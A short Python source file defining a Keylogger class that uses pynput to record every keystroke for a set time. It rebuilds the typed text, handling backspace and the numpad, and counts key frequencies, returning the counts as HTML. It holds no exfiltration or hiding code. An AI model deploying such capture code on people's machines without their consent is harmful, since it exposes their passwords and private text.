from pynput.keyboard import Listener
from pynput import keyboard
import datetime
import utils

class Keylogger():
    def __init__ (self, time):
        self.__log = ""
        self.__start = 1
        self.__time = time
        self.__keys = {}
    def setTime(self, value):
        self.__time = value    
    def run(self):
        self.__start = datetime.datetime.now()
        def anonymous(key):
            now = datetime.datetime.now()
            if now.timestamp() - self.__start.timestamp() >= self.__time:
                listener.stop()
            try:
                key_code = key.vk
            except AttributeError:
                key_code = key.value.vk
            if hasattr(key, 'vk') and key_code is not None and 96 <= int(key_code) <= 105:
                key = f'numpad.{key_code - 96}'
            key = str(key)

            if(key not in self.__keys):
                self.__keys[key] = 1
            else:
                self.__keys[key] += 1
            
            if key == "Key.space":
                key = " "
            if key == "Key.enter":
                key = "\n"
            if key == "Key.backspace":
                self.__log = self.__log[:-1]
            elif 'numpad.' in key:
                self.__log += key[-1]
            elif "Key." not in key:
                key = key.replace("'","")
                self.__log += key

        with Listener (on_press=anonymous) as listener:
            listener.join()
        self.__log = utils.newliToBr(self.__log)
        return utils.dicToHTML(self.__keys,tranpose=True)
            
    def getLog(self):
        return self.__log
    
    def getKeys(self):
        return self.__keys

